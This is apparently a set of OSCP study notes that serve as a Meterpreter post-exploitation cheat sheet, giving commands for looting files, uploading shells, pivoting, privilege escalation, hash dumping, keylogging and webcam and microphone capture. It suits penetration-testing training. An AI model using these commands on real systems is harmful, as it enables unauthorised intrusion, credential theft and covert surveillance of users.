# Meterpreter Commands

## Overview

**Meterpreter** is an advanced in-memory payload that provides:

- interactive shell access
- privilege escalation capability
- file transfer functionality
- credential harvesting
- pivoting capability
- process manipulation
- persistence mechanisms

Unlike standard shells, Meterpreter:

- runs in memory
- avoids writing files to disk
- communicates via encrypted channels
- supports modular extensions

---

# 1. Core Commands

General session management and configuration.

| Command | Purpose |
|--------|---------|
| help | show help menu |
| ? | shortcut for help |
| background | background current session |
| sessions | list active sessions |
| sessions -i <id> | interact with session |
| exit | terminate session |
| quit | terminate session |
| sleep | temporarily pause session |
| guid | show session GUID |
| uuid | show session UUID |
| info | show module info |
| load | load extensions |
| run | run post module or script |
| resource | execute commands from file |
| migrate | move Meterpreter into another process |

---

# 2. File System Commands

Used heavily during enumeration and looting.

| Command | Purpose |
|--------|---------|
| pwd | show current directory |
| cd | change directory |
| ls | list files |
| dir | list files |
| cat | display file contents |
| download | download file from target |
| upload | upload file to target |
| mkdir | create directory |
| rm | delete file |
| rmdir | remove directory |
| search | search for files |
| edit | edit file |
| checksum | file hash |
| cp | copy file |
| mv | move file |
| show_mount | list drives |

---

## Common Usage

```bash
pwd
ls
cd C:\\Users
download file.txt
upload shell.exe
search -f passwords.txt
```

---

# 3. Networking Commands

Used for pivoting and network situational awareness.

| Command | Purpose |
|--------|---------|
| ipconfig | display network interfaces |
| ifconfig | display interfaces |
| arp | display ARP table |
| netstat | show network connections |
| route | view/modify routing table |
| resolve | resolve hostnames |
| portfwd | forward ports |
| get proxy | show proxy configuration |

---

## Example

```bash
ipconfig
netstat -ano
arp
route
portfwd add -l 3389 -p 3389 -r 10.10.10.20
```

---

# 4. System Commands

Used for enumeration, privilege escalation, and process interaction.

| Command | Purpose |
|--------|---------|
| sysinfo | system information |
| getuid | current user |
| getsid | current SID |
| getpid | current process ID |
| ps | list processes |
| pgrep | search process |
| pkill | kill process |
| kill | terminate process |
| execute | run command |
| shell | spawn system shell |
| reboot | reboot target |
| shutdown | shutdown target |
| getenv | environment variables |
| localtime | system time |
| reg | interact with registry |

---

## Common Enumeration

```bash
sysinfo
getuid
ps
getpid
shell
whoami
hostname
```

---

# 5. Privilege Escalation Commands

Used to increase privileges.

| Command | Purpose |
|--------|---------|
| getsystem | attempt SYSTEM privileges |
| getprivs | list available privileges |
| steal_token | impersonate token |
| drop_token | remove impersonation |
| rev2self | revert privileges |

---

## Example

```bash
getsystem
getprivs
```

---

# 6. Credential Dumping

Extract password hashes.

| Command | Purpose |
|--------|---------|
| hashdump | dump SAM hashes |

---

## Example

```bash
hashdump
```

---

# 7. User Interface Interaction

Useful when GUI access is possible.

| Command | Purpose |
|--------|---------|
| screenshot | capture screen |
| screenshare | live desktop view |
| keyscan_start | start keylogger |
| keyscan_stop | stop keylogger |
| keyscan_dump | show keystrokes |
| idle_time | check idle time |
| enumdesktops | list desktops |
| setdesktop | change desktop |
| keyboard_send | send keystrokes |
| mouse | control mouse |

---

## Example

```bash
screenshot
keyscan_start
keyscan_dump
```

---

# 8. Webcam & Audio

Available if hardware present.

| Command | Purpose |
|--------|---------|
| webcam_list | list webcams |
| webcam_snap | take snapshot |
| webcam_stream | stream webcam |
| record_mic | record microphone |
| play | play audio on target |

---

# 9. Useful Post Modules via Meterpreter

Run post modules:

```bash
run post/windows/gather/hashdump
run post/windows/manage/migrate
run post/windows/gather/enum_logged_on_users
```

---

# 10. Process Migration

Move Meterpreter to stable process.

Important for persistence.

```bash
ps
migrate <PID>
```

Common stable processes:

```text
explorer.exe
svchost.exe
winlogon.exe
lsass.exe (advanced)
```

---

# 11. Channel Management

Meterpreter uses channels for I/O streams.

| Command | Purpose |
|--------|---------|
| channel | list channels |
| close | close channel |
| read | read channel |
| write | write to channel |

---

# 12. Typical OSCP Workflow

After session obtained:

```bash
sysinfo
getuid
getprivs
ps
migrate <PID>
hashdump
ipconfig
netstat
download important files
```

---

# 13. High Value Commands (Memorise)

## basic enumeration

```bash
sysinfo
getuid
pwd
ls
ps
ipconfig
netstat
```

## privilege escalation

```bash
getsystem
getprivs
migrate
```

## file transfer

```bash
upload
download
search
```

## pivoting

```bash
route
portfwd
```

## credential harvesting

```bash
hashdump
keyscan_start
keyscan_dump
```

---

# 14. Quick Cheat Sheet

## system info

```bash
sysinfo
getuid
getpid
ps
```

## file system

```bash
pwd
ls
cd
download file.txt
upload shell.exe
search -f *.txt
```

## networking

```bash
ipconfig
netstat
route
arp
```

## privilege escalation

```bash
getsystem
getprivs
migrate <pid>
```

## credentials

```bash
hashdump
```

## UI interaction

```bash
screenshot
keyscan_start
keyscan_dump
```

---

# 15. Exit or Background Session

Background session:

```bash
background
```

List sessions:

```bash
sessions
```

Reconnect:

```bash
sessions -i 1
```

Exit session:

```bash
exit
```

---

# Related Notes

- Metasploit modules
- payload selection
- post exploitation
- privilege escalation
- lateral movement
- pivoting

---

# Tags

#meterpreter #metasploit #postexploitation #shell #oscp #pivoting